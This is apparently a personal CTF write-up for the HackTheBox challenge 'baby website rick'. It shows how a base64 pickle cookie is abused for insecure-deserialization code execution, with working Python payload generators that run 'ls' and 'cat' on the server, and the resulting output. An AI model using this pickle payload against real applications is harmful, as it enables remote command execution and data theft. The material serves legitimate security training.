# baby website rick

Completed: Yes
Platform: HackTheBox

In the beginning, we see Rick and again the hint with `insecure deserialization`. Also, we see the object's string. Also, if you look at the cookie, you'll see a strange cookie - plan_b. Decode it with base64 and got syntax similar to python pickle serialization. I tried somehow to get back the object from this decoded string, but it is not possible. Even if you simulate your code, create a class anti_pickle_serum, you'll not receive the flag or something anyway. Also, you have to read about attacks on serialization and deserialization from here:

[https://book.hacktricks.xyz/pentesting-web/deserialization#python](https://book.hacktricks.xyz/pentesting-web/deserialization#python) 

[https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)

I tried firstly, os.system, but it doesn't work and you'll get the response code of 500. Try subprocess.check_output for the attack from hacktricks:

```python
import pickle, subprocess, base64
class anti_pickle_serum(object):
    def __reduce__(self):
        return subprocess.check_output, (['ls'],)
print(base64.b64encode(pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)))
```

And you will receive the output of ls:

```python
<span>Don't play around with this serum morty!! app.py
flag_wIp1b
static
templates
</span>
```

You have to dump a dict, because if you try to load the pickle string from base64 string, you will get the dict `{'serum': anti_pickle_serum object}`.  protocol 0 is also necessary, because without it, your string will not similar to initial cookie.

Thus, remains to take the flag with `cat flag_wIp1b`.

```python
import pickle, subprocess, base64
class anti_pickle_serum(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat', 'flag_wIp1b'],)
print(base64.b64encode(pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)))
```

Forgot to say, that you have to use python2, because the backend doesn't understand python3 serialization and it is not equal to serialization in python2.